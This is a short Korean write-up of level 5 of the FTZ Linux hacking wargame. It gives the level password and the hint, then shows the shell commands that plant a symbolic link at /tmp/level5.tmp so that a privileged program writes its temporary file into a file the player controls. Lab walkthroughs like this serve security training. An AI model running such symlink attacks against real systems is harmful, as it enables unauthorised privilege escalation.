---
sort: 5
---

# Level 5

```note
id : level5

password : what is your name?
```

```bash
[level5@ftz level5]$ cat hint

/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.
```

level5를 실행시킨 후 /tmp폴더를 살펴보았으나 level5.tmp파일은 보이지 않았다.<br>
임시파일이 프로그램 종료 전에 삭제가 되는 것으로 여겨진다.

```bash
[level5@ftz level5]$ ls -al /tmp
total 8
drwxrwxrwt    2 root     root         4096 Jan  7 20:16 .
drwxr-xr-x   20 root     root         4096 Jan  7 18:41 ..
srwxrwxrwx    1 mysql    mysql           0 Jan  7 18:41 mysql.sock
```

삭제가 되기 전에 파일내용을 낚아채기 위해 symbolic link를 사용했다.<br>
symbolic link는 리눅스에 있는 hyperlink기능으로 아래와 같이 asdf파일을 생성한 후 level5.tmp라는 이름의 symbolic link를 만들어놓으면 level5가 level5.tmp symbolic link를 통해 asdf에 내용물을 작성하게 된다.

```bash
[level5@ftz level5]$ touch /tmp/asdf
[level5@ftz level5]$ ln -s /tmp/asdf /tmp/level5.tmp
[level5@ftz level5]$ ls -al /tmp
total 8
drwxrwxrwt    2 root     root         4096 Jan  7 20:29 .
drwxr-xr-x   20 root     root         4096 Jan  7 18:41 ..
-rw-rw-r--    1 level5   level5          0 Jan  7 20:29 asdf
lrwxrwxrwx    1 level5   level5          9 Jan  7 20:29 level5.tmp -> /tmp/asdf
srwxrwxrwx    1 mysql    mysql           0 Jan  7 18:41 mysql.sock
[level5@ftz level5]$ level5
```

```tip
## 알게 된 점

symbolic link
```